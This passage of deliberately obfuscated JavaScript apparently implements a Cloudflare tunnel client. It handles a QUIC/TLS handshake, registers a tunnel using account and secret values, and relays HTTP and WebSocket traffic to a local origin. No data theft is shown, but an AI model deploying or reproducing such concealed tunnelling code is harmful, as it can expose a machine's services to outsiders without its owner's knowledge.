                    f['zxoTX'](f[kA(0x866)](g[kA(0xcd0)], g[kA(0xb64)][kA(0x615)]), this['receiveWindow'] / 0x2) && (g[kA(0xcd0)] = f['GNaxv'](g['recv'][kA(0x615)], this[kA(0x43c)]), f['VejNS'](this[kA(0x51b)][kA(0x44f)](g), 0x0) && this['creditReady']['push'](g));
                    continue;
                case '1':
                    this['_wake']();
                    continue;
                case '2':
                    this[kA(0x71c)] += h[kA(0x615)];
                    continue;
                case '3':
                    this[kA(0xf27)](g, h);
                    continue;
                case '4':
                    g['recv'] = Buffer[kA(0x7b6)]([
                        g['recv'],
                        h
                    ]);
                    continue;
                case '5':
                    f[kA(0x6ff)](this['localMaxData'], this[kA(0x71c)]) < f[kA(0x264)](this[kA(0x43c)], 0x2) && (this['localMaxData'] = f[kA(0x52d)](this[kA(0x71c)], this[kA(0x43c)]), this['creditMaxData'] = !![]);
                    continue;
                }
                break;
            }
        }
        d && !g[kA(0xce1)] && f['WfAHD'](g[kA(0x96e)][kA(0x7da)], g[kA(0xb64)][kA(0x615)]) && (g['ended'] = !![], this[kA(0x64a)](g));
    }
    [a0d0(0x9db)]() {
        const kB = a0d0;
        !this[kB(0x85c)] && this[kB(0xd24)]();
    }
    [a0d0(0x722)](a, b) {
        const kC = a0d0, c = {
                'HKIWa': function (d, f) {
                    return d === f;
                },
                'pJypK': 'awaiting-server-hello',
                'EYybv': 'server\x20hello:\x20',
                'zcRQz': function (d, f) {
                    return d === f;
                },
                'JpPEn': function (d, f) {
                    return d + f;
                },
                'EUHRv': 'quic\x20server\x20hello\x20received,\x20handshake\x20keys\x20installed'
            };
        if (a === a0bS)
            return;
        if (c['HKIWa'](a, a0bQ) && this['tls']['state'] === c[kC(0xec0)]) {
            this[kC(0x13e)] = Buffer[kC(0x7b6)]([
                this[kC(0x13e)],
                b
            ]);
            let d;
            try {
                d = this['tls'][kC(0x8dc)](this['serverHello']);
            } catch (g) {
                this[kC(0x2c1)](c[kC(0xd1d)] + g['message']);
                return;
            }
            if (c['zcRQz'](d, null))
                return;
            this[kC(0x13e)] = Buffer['alloc'](0x0);
            let f;
            try {
                f = this[kC(0x31b)]['handleServerHello'](Buffer[kC(0x58d)](d));
            } catch (h) {
                this[kC(0x2c1)](c[kC(0xd0a)](c[kC(0xd1d)], h[kC(0xf18)]));
                return;
            }
            this[kC(0x30b)][a0bR] = f, this[kC(0x6d3)][kC(0xb89)](c[kC(0x97a)]);
            return;
        }
        this[kC(0x446)] = Buffer['concat']([
            this[kC(0x446)],
            b
        ]), this['_pumpHandshakeMessages']();
    }
    [a0d0(0xac3)]() {
        const kD = a0d0, a = {
                'RNPPn': function (b, c) {
                    return b + c;
                },
                'lJfAJ': function (b, c) {
                    return b < c;
                },
                'plumT': function (b, c) {
                    return b === c;
                },
                'mwwFR': function (b, c) {
                    return b + c;
                },
                'rGUkN': 'quic\x20peer\x20params\x20max-data=',
                'YzULp': function (b, c) {
                    return b === c;
                },
                'jzODF': function (b, c) {
                    return b !== c;
                },
                'SbtaO': function (b, c) {
                    return b(c);
                },
                'oWiUx': kD(0xad0),
                'Zxfaj': kD(0x371),
                'tQzvs': function (b, c) {
                    return b + c;
                },
                'sCvBe': kD(0x288)
            };
        while (this[kD(0x446)][kD(0x615)] >= 0x4) {
            const b = a[kD(0xe3b)](0x4, this['handshakeBytes'][kD(0xd7)](0x1, 0x3));
            if (a['lJfAJ'](this[kD(0x446)][kD(0x615)], b))
                return;
            const c = Buffer[kD(0x58d)](this[kD(0x446)][kD(0x3d1)](0x0, b));
            this['handshakeBytes'] = this[kD(0x446)][kD(0x3d1)](b);
            let d;
            try {
                d = this[kD(0x31b)][kD(0xf29)](c);
            } catch (f) {
                this[kD(0x2c1)](kD(0xc12) + f[kD(0xf18)]);
                return;
            }
            if (this[kD(0x31b)][kD(0xa84)] && a[kD(0x40a)](this[kD(0xa84)], null)) {
                const g = kD(0xbe4)['split']('|');
                let h = 0x0;
                while (!![]) {
                    switch (g[h++]) {
                    case '0':
                        this['peerMaxData'] = this[kD(0x31b)]['remoteParameters'][a0bV[kD(0xbd3)]] || 0x0;
                        continue;
                    case '1':
                        this[kD(0xa84)] = this[kD(0x31b)]['remoteParameters'];
                        continue;
                    case '2':
                        this['peerStreamLocal'] = this['tls'][kD(0xa84)][a0bV[kD(0x3cd)]] || 0x0;
                        continue;
                    case '3':
                        this[kD(0x6d3)][kD(0xb89)](a[kD(0xcaa)](a[kD(0xcaa)](a[kD(0xe3b)](a[kD(0xcaa)](a['rGUkN'], this[kD(0x252)]), '\x20stream='), this[kD(0x688)]), kD(0xaf1)) + (this[kD(0x31b)][kD(0xa84)][a0bV[kD(0xdff)]] || 0x0));
                        continue;
                    case '4':
                        this[kD(0xf12)] = Math[kD(0xb66)](a[kD(0xa30)](this['tls'][kD(0xa84)][a0bV['maxAckDelay']], undefined) ? 0x19 : this['tls'][kD(0xa84)][a0bV[kD(0x393)]], 0x64);
                        continue;
                    case '5':
                        this[kD(0x688)] = this[kD(0x31b)][kD(0xa84)][a0bV[kD(0x645)]] || 0x0;
                        continue;
                    }
                    break;
                }
            }
            if (a[kD(0x3b2)](d, null)) {
                if (this[kD(0x54f)]) {
                    const i = a[kD(0xbec)](a0cl, this[kD(0x31b)][kD(0xa4d)]);
                    if (i) {
                        this[kD(0x2c1)](a[kD(0xe3b)](a['oWiUx'], i));
                        return;
                    }
                }
                this[kD(0x30b)][a0bS] = {
                    'send': d[kD(0xb36)],
                    'recv': d[kD(0xb64)]
                }, this[kD(0x2cb)] = [{
                        'keys': d['recv'],
                        'phase': 0x0
                    }], this['appSendKeys'][0x0] = d[kD(0xb36)], this['cryptoSend'][a0bR]['append'](d[kD(0x591)], ![]), this['handshakeComplete'] = !![];
                !d[kD(0x345)] && this['log'][kD(0xd62)](a[kD(0x61e)]);
                this[kD(0x6d3)][kD(0xb89)](a[kD(0x594)](a[kD(0x2d1)], this[kD(0x31b)]['negotiatedAlpn'] || '?'));
                if (a['jzODF'](this['settle'], null)) {
                    const j = this[kD(0x1f8)];
                    this[kD(0x1f8)] = null, j[kD(0x983)](this);
                }
                this[kD(0xc05)]();
                return;
            }
        }
    }
    ['close'](a) {
        const kE = a0d0, b = {
                'dCJcc': kE(0x8b1),
                'QImFr': function (f, g) {
                    return f || g;
                },
                'csLpm': kE(0xd81),
                'OGbrb': function (f, g, h) {
                    return f(g, h);
                }
            }, c = b['dCJcc'][kE(0xc0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[kE(0x6b1)] = b[kE(0x51f)](a, b['csLpm']);
                continue;
            case '1':
                if (this[kE(0x85c)])
                    return;
                continue;
            case '2':
                this[kE(0xd24)]();
                continue;
            case '3':
                b[kE(0xc52)](setTimeout, () => this[kE(0xf26)](null), 0xc8);
                continue;
            case '4':
                this[kE(0xd5d)] = !![];
                continue;
            }
            break;
        }
    }
    [a0d0(0x2c1)](a) {
        const kF = a0d0, b = { 'ozKdG': kF(0x74b) };
        if (this[kF(0x85c)])
            return;
        this[kF(0x6d3)][kF(0xb89)](b['ozKdG'] + a), this[kF(0xf26)](new Error(a));
    }
    [a0d0(0xf26)](a) {
        const kG = a0d0, b = {
                'BfYAf': kG(0x85c),
                'LVEAR': function (c, d) {
                    return c(d);
                },
                'FjaEv': function (c, d) {
                    return c !== d;
                }
            };
        if (this[kG(0x85c)])
            return;
        this[kG(0x85c)] = a ? a['message'] : b[kG(0x1f3)];
        this[kG(0x968)] !== null && (b[kG(0xe17)](clearInterval, this[kG(0x968)]), this[kG(0x968)] = null);
        if (this[kG(0x274)] !== null) {
            try {
                this['socket'][kG(0xd81)]();
            } catch (c) {
            }
            this[kG(0x274)] = null;
        }
        if (!this[kG(0x712)] && b['FjaEv'](this[kG(0x1f8)], null)) {
            const d = this[kG(0x1f8)];
            this[kG(0x1f8)] = null, d[kG(0x73e)](a || new Error('connection\x20closed'));
        } else
            this[kG(0xd6a)](a);
    }
}
function a0co(a, b) {
    const kH = a0d0, c = {
            'ZSQor': function (f, g) {
                return f === g;
            }
        }, d = [];
    for (const [f, g] of a) {
        c[kH(0x455)](f['toLowerCase'](), b) && d[kH(0x59a)](g);
    }
    return d;
}
function a0cp(a) {
    const kI = a0d0, b = {
            'CNocF': function (i, j) {
                return i !== j;
            },
            'YSOQS': function (i, j) {
                return i + j;
            },
            'VNetr': '\x20malformed',
            'nUxff': function (i, j) {
                return i + j;
            },
            'qjGds': function (i, j) {
                return i(j);
            },
            'xCQhq': kI(0x325),
            'DUQgj': function (i, j, k) {
                return i(j, k);
            },
            'xNYdK': kI(0x2ba),
            'oKIrY': kI(0xb1c),
            'yiGXE': function (i, j) {
                return i + j;
            },
            'ezQnA': function (i, j) {
                return i > j;
            }
        }, c = new Map(), d = [];
    for (const [i, j] of a[kI(0xcc8)]) {
        if (i[kI(0x44f)](a0bG) >= 0x0) {
            const k = i[kI(0xc0)](':');
            if (b[kI(0x171)](k[kI(0x615)], 0x2))
                throw new Error(b[kI(0xeb5)](kI(0xc62), i) + b['VNetr']);
            d[kI(0x59a)]([
                k[0x1],
                j
            ]);
        } else
            c[kI(0x6e7)](i, j);
    }
    let f = a[kI(0x4a2)];
    try {
        const l = new URL(a[kI(0x4a2)]);
        f = b[kI(0xd09)](l[kI(0x372)], l['search']);
    } catch (m) {
        f = a[kI(0x4a2)];
    }
    const g = b[kI(0x94c)](Number, a0co(d, b[kI(0x534)])[0x0]), h = b['DUQgj'](a0co, d, b[kI(0xbf7)])[kI(0x782)](',')[kI(0x777)]()[kI(0xd32)](b[kI(0x826)]);
    return {
        'type': a[kI(0x527)],
        'method': c[kI(0xb2b)](a0bD) || 'GET',
        'host': c[kI(0xb2b)](a0bE) || '',
        'path': f[kI(0x46a)]('/') ? f : b['yiGXE']('/', f),
        'headers': d,
        'contentLength': Number[kI(0x3f2)](g) && g > 0x0 ? g : null,
        'bodyless': !h && !(Number['isInteger'](g) && b[kI(0x725)](g, 0x0))
    };
}
function a0cq(a) {
    const kJ = a0d0, b = {
            'DVOEd': function (d, f) {
                return d !== f;
            },
            'pQSoV': function (d, f) {
                return d >= f;
            }
        }, c = a[kJ(0x6be)];
    if (c[kJ(0xb31)])
        return !![];
    if (a['ended'])
        return !![];
    return b['DVOEd'](c[kJ(0xb30)], null) && b[kJ(0xcd3)](a[kJ(0x72a)][kJ(0x615)], c['contentLength']);
}
class a0cr {
    constructor(a, b, c, d, f) {
        const kK = a0d0;
        this[kK(0xc8d)] = a, this[kK(0xb3d)] = b, this['request'] = c, this['origin'] = d, this[kK(0x6d3)] = f, this[kK(0xb08)] = [], this[kK(0xc76)] = [], this['stopped'] = ![], this['sock'] = null;
    }
    ['feed'](a) {
        const kL = a0d0, b = {
                'WyNXW': function (c, d) {
                    return c === d;
                }
            };
        if (b[kL(0x6dc)](a, null))
            this[kL(0xb08)][kL(0x59a)](null);
        else
            a['length'] && this['queue'][kL(0x59a)](a);
        this[kL(0x9db)]();
    }
    [a0d0(0x7ef)]() {
        const kM = a0d0;
        if (this[kM(0x240)])
            return;
        this[kM(0x240)] = !![], this[kM(0x9db)]();
        if (this[kM(0x2d0)] !== null)
            try {
                this['sock']['destroy']();
            } catch (a) {
            }
    }
    [a0d0(0x9db)]() {
        const kN = a0d0;
        for (const a of this['waiters']) {
            a();
        }
        this[kN(0xc76)] = [];
    }
    async [a0d0(0x925)]() {
        const kO = a0d0;
        while (!this[kO(0x240)]) {
            if (this[kO(0xb08)][kO(0x615)])
                return this[kO(0xb08)][kO(0x99b)]();
            await new Promise(a => this['waiters'][kO(0x59a)](a));
        }
        return null;
    }
    async [a0d0(0x550)]() {
        const kP = a0d0, a = {
                'mAvba': 'origin\x20websocket\x20upgrade\x20rejected:\x20',
                'DksRb': function (b, c) {
                    return b(c);
                },
                'aQLNP': function (b, c) {
                    return b === c;
                },
                'dlkiG': kP(0x2ba),
                'RqRSf': function (b, c) {
                    return b === c;
                },
                'lDAEZ': kP(0x325),
                'SXWyF': kP(0x557),
                'kRVwb': kP(0x500),
                'DGnXQ': function (b, c) {
                    return b + c;
                },
                'xhknW': function (b, c) {
                    return b + c;
                },
                'tSLOa': 'websocket\x20stream\x20',
                'kUapZ': kP(0x670)
            };
        try {
            this[kP(0x2d0)] = await a0bs(this[kP(0xf1f)]), this[kP(0xd89)]();
            const b = await a0bv(this[kP(0x2d0)]);
            if (b['status'] !== 0x65) {
                this['session'][kP(0x8fd)](this[kP(0xb3d)][kP(0xe12)], a['mAvba'] + b['status'], [[
                        a0bF,
                        String(b[kP(0xab3)])
                    ]], !![]);
                try {
                    this['sock'][kP(0x4d7)]();
                } catch (d) {
                }
                return;
            }
            const c = [[
                    a0bF,
                    a[kP(0x6a4)](String, b[kP(0xab3)])
                ]];
            for (const [f, g] of b[kP(0xe76)]) {
                const h = f[kP(0x777)]();
                if (a[kP(0x8cb)](h, a[kP(0x541)]) || a[kP(0x61d)](h, a[kP(0xba6)]))
                    continue;
                if (h['startsWith'](a[kP(0xa8d)]) || h[kP(0x46a)](kP(0xbbd)) || h[kP(0x46a)](a['kRVwb']))
                    continue;
                c['push']([
                    a[kP(0xc00)](a[kP(0xbf8)](a0bG, ':'), f),
                    g
                ]);
            }
            this[kP(0xc8d)][kP(0x8fd)](this[kP(0xb3d)][kP(0xe12)], '', c, ![]), this[kP(0x9bd)]()[kP(0xef4)](() => {
            }), await this[kP(0x20d)](b[kP(0x349)]);
        } catch (i) {
            this[kP(0x6d3)][kP(0xd62)](a['xhknW'](a[kP(0xc00)](a['tSLOa'], this[kP(0xb3d)]['stream']['id']), a[kP(0xd8b)]) + i), this[kP(0xc8d)]['respond'](this['state'], a['DksRb'](String, i[kP(0xf18)] || i), 0x1f6);
        } finally {
            this['stop']();
        }
    }
    async ['pumpOrigin'](a) {
        const kQ = a0d0;
        a[kQ(0x615)] && this[kQ(0xb3d)][kQ(0xe12)][kQ(0x5a6)](a, ![]);
        for await (const b of this[kQ(0x2d0)]) {
            if (this[kQ(0x240)])
                break;
            this[kQ(0xb3d)][kQ(0xe12)][kQ(0x5a6)](b, ![]);
        }
        !this['stopped'] && this[kQ(0xb3d)][kQ(0xe12)][kQ(0x5a6)](Buffer[kQ(0xacf)](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const kR = a0d0, a = {
                'pxWrm': function (b, c) {
                    return b === c;
                }
            };
        while (!this[kR(0x240)]) {
            const b = await this[kR(0x925)]();
            if (a['pxWrm'](b, null)) {
                try {
                    this['sock'][kR(0x65c)]();
                } catch (c) {
                }
                return;
            }
            try {
                this[kR(0x2d0)][kR(0x5a6)](b);
            } catch (d) {
                this[kR(0x240)] = !![];
                return;
            }
        }
    }
    [a0d0(0xd89)]() {
        const kS = a0d0, a = {
                'Ybctd': function (i, j) {
                    return i + j;
                },
                'rluvp': kS(0xe60),
                'itaGd': kS(0xc32),
                'Chmiz': function (i, j) {
                    return i === j;
                },
                'JSeAc': kS(0xd12),
                'prvKs': kS(0x70f),
                'YGuDX': kS(0x325),
                'Uglom': kS(0x2ba),
                'YONai': function (i, j) {
                    return i === j;
                },
                'EfTlk': function (i, j) {
                    return i === j;
                },
                'EVnJn': kS(0x3b5),
                'IzScT': kS(0x54c),
                'lDNLW': 'Sec-WebSocket-Key:\x20',
                'xRVAp': kS(0xc75),
                'LwHXB': kS(0x728),
                'mqmwL': 'Upgrade:\x20websocket',
                'kkBCS': function (i, j) {
                    return i + j;
                },
                'VZUms': 'latin1'
            }, b = new URL(this[kS(0xf1f)]), c = this[kS(0x6be)][kS(0xda2)][kS(0x46a)]('/') ? this['request'][kS(0xda2)] : '/' + this['request'][kS(0xda2)], d = [a[kS(0x483)]('GET\x20' + c, a[kS(0x795)])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[kS(0x6be)][kS(0xe76)]) {
            const k = i['toLowerCase']();
            if (k === a[kS(0x7af)] || a[kS(0x537)](k, a[kS(0x927)]) || a[kS(0x537)](k, a[kS(0xe42)]) || a[kS(0x537)](k, a['YGuDX']) || k === a[kS(0xa71)])
                continue;
            if (a[kS(0x8c5)](k, 'sec-websocket-key'))
                f = !![];
            else {
                if (a[kS(0x78d)](k, a[kS(0x4d6)]))
                    g = !![];
                else
                    a[kS(0x78d)](k, 'origin') && (h = !![]);
            }
            d[kS(0x59a)](a['Ybctd'](a[kS(0x483)](i, ':\x20'), j));
        }
        d[kS(0x59a)](a['IzScT'] + b[kS(0xc32)]), !h && this[kS(0x6be)]['host'] && d['push']('Origin:\x20https://' + this['request'][kS(0xc32)]), !f && d[kS(0x59a)](a['Ybctd'](a[kS(0xc51)], a0k['randomBytes'](0x10)[kS(0xa27)](a['xRVAp']))), !g && d[kS(0x59a)](a[kS(0x511)]), d[kS(0x59a)](kS(0xc35)), d[kS(0x59a)](a['mqmwL']), this[kS(0x2d0)][kS(0x5a6)](Buffer[kS(0x58d)](a[kS(0x512)](d[kS(0x782)]('\x0d\x0a'), kS(0x874)), a[kS(0x21e)]));
    }
}
class a0cs {
    constructor(a, b, c, d, f, g, h) {
        const kT = a0d0, i = '1|12|11|13|3|0|2|16|6|4|15|14|7|9|8|5|10'[kT(0xc0)]('|');
        let j = 0x0;
        while (!![]) {
            switch (i[j++]) {
            case '0':
                this['connIndex'] = g;
                continue;
            case '1':
                this[kT(0x18d)] = a;
                continue;
            case '2':
                this[kT(0x6d3)] = h;
                continue;
            case '3':
                this['tunnelId'] = f;
                continue;
            case '4':
                this[kT(0x4b5)] = new Set();
                continue;
            case '5':
                this[kT(0x18d)][kT(0x64a)] = k => this[kT(0x98a)](k);
                continue;
            case '6':
                this[kT(0x3a8)] = new Map();
                continue;
            case '7':
                this[kT(0x718)] = new Promise((k, l) => {
                    const kU = kT;
                    this[kU(0x1f8)] = {
                        'resolve': k,
                        'reject': l
                    };
                });
                continue;
            case '8':
                this['conn'][kT(0xf27)] = (k, l) => this['receiveStream'](k, l);
                continue;
            case '9':
                this[kT(0x18d)]['onStream'] = k => this['acceptStream'](k);
                continue;
            case '10':
                this['conn']['onClose'] = k => this[kT(0x7ef)](k);
                continue;
            case '11':
                this['accountTag'] = c;
                continue;
            case '12':
                this[kT(0xf1f)] = b;
                continue;
            case '13':
                this[kT(0x3fd)] = d;
                continue;
            case '14':
                this[kT(0x1f8)] = null;
                continue;
            case '15':
                this[kT(0x240)] = ![];
                continue;
            case '16':
                this[kT(0x4f6)] = null;
                continue;
            }
            break;
        }
    }
    [a0d0(0x550)]() {
        const kV = a0d0, a = this[kV(0x18d)][kV(0x1c0)]();
        return this[kV(0x4f6)] = new a0br(this[kV(0x18d)], a['id'], this['log'], { 'quic': !![] }), this['control'][kV(0xb58)](this['accountTag'], this['tunnelSecret'], this['tunnelId'], this['connIndex']), this[kV(0x718)];
    }
    ['stop'](a) {
        const kW = a0d0;
        if (this['stopped'])
            return;
        this['stopped'] = !![], this[kW(0x3a8)][kW(0x13c)]();
        for (const b of this[kW(0x4b5)]) {
            b[kW(0x7ef)]();
        }
        this[kW(0x4b5)][kW(0x13c)](), a ? this[kW(0x1f8)][kW(0x73e)](a) : this[kW(0x1f8)]['resolve']();
    }
    [a0d0(0x647)](a) {
        const kX = a0d0, b = {
                'FJxbf': function (c, d) {
                    return c & d;
                }
            };
        if (b[kX(0x49d)](a['id'], 0x3) !== 0x1)
            return;
        this[kX(0x3a8)][kX(0x6e7)](a['id'], {
            'stream': a,
            'buffer': Buffer[kX(0xacf)](0x0),
            'body': Buffer[kX(0xacf)](0x0),
            'request': null,
            'websocket': ![],
            'relay': null,
            'ended': ![],
            'served': ![],
            'failed': ![]
        });
    }
    [a0d0(0x84c)](a, b) {
        const kY = a0d0, c = {
                'Zcjzn': function (f, g) {
                    return f !== g;
                },
                'PrmFb': function (f, g) {
                    return f === g;
                }
            };
        if (c[kY(0xbac)](this[kY(0x4f6)], null) && c[kY(0xc82)](a['id'], this[kY(0x4f6)][kY(0xc97)])) {
            this['control']['feed'](b);
            return;
        }
        const d = this['requests'][kY(0xb2b)](a['id']);
        if (d === undefined || d[kY(0xdca)])
            return;
        if (c['PrmFb'](d['request'], null))
            d[kY(0xb8e)] = Buffer[kY(0x7b6)]([
                d[kY(0xb8e)],
                b
            ]), this[kY(0x929)](d);
        else
            b[kY(0x615)] && (d[kY(0xbcf)] && d[kY(0xc08)] !== null ? d['relay'][kY(0x753)](b) : d['body'] = Buffer[kY(0x7b6)]([
                d[kY(0x72a)],
                b
            ]));
        this['maybeServe'](d);
    }
    ['endStream'](a) {
        const kZ = a0d0, b = {
                'EdvEl': function (d, f) {
                    return d !== f;
                },
                'Bffvd': function (d, f) {
                    return d === f;
                },
                'jHfbi': function (d, f) {
                    return d === f;
                }
            };
        if (b[kZ(0xdb9)](this[kZ(0x4f6)], null) && b[kZ(0x805)](a['id'], this[kZ(0x4f6)]['streamId'])) {
            this[kZ(0x4f6)][kZ(0x591)] = !![];
            return;
        }
        const c = this[kZ(0x3a8)][kZ(0xb2b)](a['id']);
        if (b[kZ(0x2c6)](c, undefined))
            return;
        c[kZ(0xce1)] = !![];
        if (c[kZ(0xbcf)] && b[kZ(0xdb9)](c[kZ(0xc08)], null)) {
            c['relay'][kZ(0x753)](null);
            return;
        }
        c[kZ(0x6be)] !== null ? this['maybeServe'](c) : this['requests'][kZ(0xcd1)](a['id']);
    }
    ['parseRequest'](a) {
        const l0 = a0d0, b = {
                'kbWcv': function (h, i) {
                    return h < i;
                },
                'sUVfu': function (h, i) {
                    return h + i;
                },
                'iepSB': function (h, i) {
                    return h + i;
                },
                'DHxty': l0(0x4e4),
                'HlLgu': '\x20is\x20not\x20a\x20v1\x20tunnel\x20data\x20stream',
                'jODRT': function (h, i) {
                    return h + i;
                },
                'DrEgn': l0(0x80e),
                'zUQcx': function (h, i, j) {
                    return h(i, j);
                },
                'nSafO': function (h, i) {
                    return h(i);
                },
                'bxqly': function (h, i) {
                    return h + i;
                },
                'DSSED': function (h, i) {
                    return h + i;
                },
                'QSjMh': '\x20has\x20an\x20unreadable\x20ConnectRequest:\x20',
                'dCBmy': function (h, i) {
                    return h + i;
                }
            }, c = a['buffer'];
        if (b[l0(0x3e4)](c[l0(0x615)], a0bA[l0(0x615)]))
            return;
        if (!c[l0(0x3d1)](0x0, a0by['length'])[l0(0xa7)](a0by)) {
            this[l0(0x6d3)][l0(0xd62)](b[l0(0x1d2)](b['iepSB'](b[l0(0xca8)], a['stream']['id']), b[l0(0xcd6)])), a['failed'] = !![];
            return;
        }
        if (c[l0(0x3d1)](0x6, 0x8)[l0(0xa27)](l0(0x80e)) !== '01') {
            this[l0(0x6d3)][l0(0xd62)](b['jODRT'](b[l0(0xca8)] + a[l0(0xe12)]['id'], l0(0x4ba)) + c['subarray'](0x6, 0x8)[l0(0xa27)](b[l0(0xc7)])), a['failed'] = !![];
            return;
        }
        const [d, f] = b[l0(0xc58)](a0ba, c[l0(0x3d1)](a0bA[l0(0x615)]), 0x1);
        if (!d[l0(0x615)])
            return;
        let g;
        try {
            g = b[l0(0xb3)](a0bg, d[0x0]);
        } catch (h) {
            this['log'][l0(0xd62)](b[l0(0x151)](b['DSSED'](l0(0x4e4), a[l0(0xe12)]['id']), b['QSjMh']) + h), a[l0(0xdca)] = !![];
            return;
        }
        a[l0(0x72a)] = f, a[l0(0xb8e)] = Buffer[l0(0xacf)](0x0);
        try {
            a[l0(0x6be)] = b[l0(0xb3)](a0cp, g), a['request']['type'] === a0bC[l0(0xbcf)] && (a[l0(0xbcf)] = !![]);
        } catch (i) {
            this[l0(0x6d3)][l0(0xd62)](b['iepSB'](b[l0(0x5a5)](b['DHxty'], a[l0(0xe12)]['id']) + ':\x20', i)), a[l0(0xdca)] = !![], this['respond'](a, String(i[l0(0xf18)] || i), 0x1f6);
        }
    }
    [a0d0(0x439)](a) {
        const l1 = a0d0, b = {
                'WnjYH': function (c, d) {
                    return c(d);
                }
            };
        if (a[l1(0x4c7)] || a[l1(0x6be)] === null || a['failed'] || !b[l1(0xc74)](a0cq, a))
            return;
        a[l1(0x4c7)] = !![], this['serveRequest'](a);
    }
    async [a0d0(0x2b5)](a) {
        const l2 = a0d0, b = {
                'tKwwZ': function (f, g) {
                    return f === g;
                },
                'LkJFe': function (f, g) {
                    return f !== g;
                },
                'HkKOo': function (f, g) {
                    return f + g;
                },
                'hczpY': function (f, g) {
                    return f + g;
                },
                'lrbTK': l2(0x3e1),
                'yhGTH': l2(0x107),
                'tlHju': function (f, g, h, i, j, k) {
                    return f(g, h, i, j, k);
                },
                'JCrpE': function (f, g) {
                    return f(g);
                },
                'FIMiw': l2(0x2ba),
                'yckrA': function (f, g) {
                    return f + g;
                },
                'uhCOz': l2(0xdfb),
                'EWusG': function (f, g) {
                    return f + g;
                },
                'MmHeJ': function (f, g) {
                    return f + g;
                },
                'VEdua': l2(0x85b)
            }, c = a['stream'], d = a[l2(0x6be)];
        try {
            if (b[l2(0x494)](d[l2(0x527)], a0bC[l2(0xbcf)])) {
                this[l2(0x1a6)](a);
                return;
            }
            if (b[l2(0xc93)](d[l2(0x527)], a0bC['http']))
                throw new Error(b[l2(0x43a)](b[l2(0x238)](b[l2(0xb15)], d[l2(0x527)]), b['yhGTH']));
            const f = await b[l2(0x8c2)](a0bu, this[l2(0xf1f)], d[l2(0xae)], d[l2(0xda2)], d[l2(0xe76)], a[l2(0x72a)]), g = [[
                        a0bF,
                        b[l2(0xa04)](String, f['status'] === 0x65 ? 0xc8 : f['status'])
                    ]];
            let h = ![];
            for (const [i, j] of f[l2(0xe76)]) {
                const k = i['toLowerCase']();
                if (k === b[l2(0x627)])
                    continue;
                b[l2(0x494)](k, l2(0x70d)) && (h = !![]), g[l2(0x59a)]([
                    b[l2(0x238)](b[l2(0x433)](a0bG, ':'), i),
                    j
                ]);
            }
            if (!h) {
                const l = a0bj(d[l2(0xda2)]);
                l && g[l2(0x59a)]([
                    b[l2(0x238)](a0bG, b['uhCOz']),
                    l
                ]);
            }
            this[l2(0x8fd)](c, '', g, ![]);
            for await (const m of f['body']) {
                c[l2(0x5a6)](m, ![]);
            }
            c[l2(0x5a6)](Buffer['alloc'](0x0), !![]);
        } catch (n) {
            this[l2(0x6d3)][l2(0xd62)](b[l2(0x768)](b['HkKOo'](b[l2(0x35d)](l2(0x4e4), c['id']), b['VEdua']), n)), this['respond'](a, b[l2(0xa04)](String, n[l2(0xf18)] || n), 0x1f6);
        } finally {
            !a[l2(0xbcf)] && this['requests'][l2(0xcd1)](c['id']);
        }
    }
    [a0d0(0x1a6)](a) {
        const l3 = a0d0, b = new a0cr(this, a, a[l3(0x6be)], this[l3(0xf1f)], this[l3(0x6d3)]);
        a[l3(0xc08)] = b, this[l3(0x4b5)][l3(0x6b6)](b), a[l3(0x72a)][l3(0x615)] && (b[l3(0x753)](a[l3(0x72a)]), a[l3(0x72a)] = Buffer[l3(0xacf)](0x0)), b[l3(0x550)]()[l3(0xef4)](() => {
        })[l3(0x290)](() => {
            const l4 = l3;
            this[l4(0x4b5)][l4(0xcd1)](b), this[l4(0x3a8)][l4(0xcd1)](a[l4(0xe12)]['id']);
        });
    }
    [a0d0(0xc0e)](a, b, c) {
        const l5 = a0d0, d = {
                'bVbaj': function (f, g) {
                    return f(g);
                }
            };
        this['writeResponse'](a[l5(0xe12)], b, [[
                a0bF,
                d[l5(0xda5)](String, c)
            ]], !![]);
    }
    [a0d0(0x8fd)](a, b, c, d) {
        const l6 = a0d0;
        if (this[l6(0x240)] || a['send'][l6(0xb0f)])
            return;
        a[l6(0x5a6)](Buffer[l6(0x7b6)]([
            a0bA,
            a0bh(b, c)
        ]), d);
    }
}
async function a0ct(a, b, c) {
    const l7 = a0d0, d = {
            'GhMNG': function (h, i) {
                return h === i;
            },
            'yNDam': function (h, i) {
                return h + i;
            },
            'CddJb': function (h, i) {
                return h + i;
            },
            'IwnGW': l7(0x783),
            'zsQuW': l7(0x516),
            'jYpwO': function (h, i) {
                return h + i;
            },
            'yeaFY': function (h, i) {
                return h + i;
            },
            'EEJBQ': l7(0x87c),
            'XDytp': l7(0x6a7)
        }, f = a0aQ['slice']()[l7(0xa25)](() => Math[l7(0xdd7)]() - 0.5);
    let g = null;
    for (const h of f) {
        const i = new a0cn({
            'logger': a,
            'host': h,
            'port': a0aR,
            'serverName': a0bJ,
            'alpn': a0bI,
            'idleTimeout': b === undefined ? 0x7530 : b,
            'verifyCertificate': d['GhMNG'](c, !![])
        });
        try {
            return await i[l7(0xdf8)](), a[l7(0x6e3)](d[l7(0x9ff)](d['yNDam'](d['yNDam'](d[l7(0x8f2)](d[l7(0x8f5)], h), ':'), a0aR), d[l7(0xcf5)])), i;
        } catch (j) {
            g = j, a[l7(0xd62)](d[l7(0xb7b)](d[l7(0x8f2)](d[l7(0x8b2)](d[l7(0x5e8)], h), l7(0x670)), j[l7(0xf18)]));
            try {
                i['close'](d[l7(0xee8)]);
            } catch (k) {
            }
        }
    }
    throw new Error(d[l7(0x8f2)]('all\x20Cloudflare\x20edges\x20failed:\x20', g));
}
const a0cu = 0x2;
function a0cv(a, b, c) {
    const l8 = a0d0, d = {
            'PUlnW': function (g, h, i) {
                return g(h, i);
            },
            'bvprY': function (g, h) {
                return g < h;
            }
        }, f = d[l8(0x6d6)](parseInt, process.env[a] || '', 0xa);
    if (!Number[l8(0x3f2)](f) || d[l8(0x135)](f, c))
        return b;
    return f;
}
const a0cw = a0cv(a0d0(0x424), 0x5, 0x2), a0cx = 0x1e, a0cy = a0cv(a0d0(0xe13), 0x2, 0x1), a0cz = a0cv('KISAMA_ARGO_RETRY_MAX_SECONDS', 0x12c, 0x3c);
function a0cA(a) {
    const l9 = a0d0, b = {
            'yauIN': function (d, f) {
                return d <= f;
            },
